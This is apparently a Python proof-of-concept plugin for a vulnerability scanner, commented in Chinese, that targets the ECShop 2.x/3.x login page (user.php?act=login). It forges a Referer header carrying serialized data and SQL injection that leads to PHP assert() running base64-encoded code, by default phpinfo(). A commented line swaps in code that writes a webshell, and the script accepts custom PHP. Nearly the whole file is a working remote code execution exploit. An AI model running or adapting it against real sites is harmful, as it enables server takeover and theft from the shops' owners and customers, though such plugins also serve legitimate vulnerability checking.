# 支持自定义php代码和2.x 3.x POC
# 参考：
# https://www.t00ls.net/viewthread.php?tid=47520&highlight=ecshop
# https://www.t00ls.net/viewthread.php?tid=47592&highlight=ecshop
# https://github.com/vulhub/vulhub

import HackRequests
import base64


def buildpoc(version:int = 2):
    # php_souce = b"""file_put_contents('xxxx.php','<?php phpinfo(); ?>');"""  # 写入webshell
    php_souce = b'''phpinfo();'''
    php_souce_b64 = base64.b64encode(php_souce).decode("utf8")
    poc_tmp = "{$asd'];assert(base64_decode('%s'));//}xxx" % (php_souce_b64)
    poc_hex = "0x" + "".join("{:02x}".format(ord(c)) for c in poc_tmp)
    poc = '*/SELECT 1,0x2d312720554e494f4e2f2a,3,4,5,6,7,8,{},10-- -'.format(poc_hex)

    hash3 = '45ea207d7a2b68c49582d2d22adf953a'
    hash2 = '554fcae493e564ee0dc75bdf2ebf94ca'

    poc_length = len(poc)
    poc_referer_tmp = """%sads|a:2:{s:3:"num";s:%s:"%s";s:2:"id";s:11:"-1' UNION/*";}%s"""

    if version == 2:

        poc_referer = poc_referer_tmp % (hash2, poc_length, poc, hash2)
    else:
        poc_referer = poc_referer_tmp % (hash3, poc_length, poc, hash3)
    return poc_referer


def poc(arg, **kwargs):
    flagText = "allow_url_fopen"
    hack = HackRequests.hackRequests()
    headers = '''
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: {}
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
    '''
    url = arg + "/user.php?act=login"
    payload2 = headers.format(buildpoc(2))
    payload3 = headers.format(buildpoc(3))
    hh = hack.http(url, headers=payload2)
    result = {
        "name": "ecshop 2.x/3.x 代码执行",  # 插件名称
        "content": "详情信息:http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/",  # 插件返回内容详情，会造成什么后果。
        "url": "",  # 漏洞存在url
        "log": {
            "send": "send",
            "response": "response"
        },
        "tag": "code_eval"  # 漏洞标签
    }

    if flagText in hh.text():
        result["url"] = arg
        result["log"] = hh.log
        return result
    hh = hack.http(url, headers=payload3)
    if flagText in hh.text():
        result["url"] = arg
        result["log"] = hh.log
        return result


if __name__ == '__main__':
    url = "http://127.0.0.1:8080"
    p = poc(url)
    print(p)
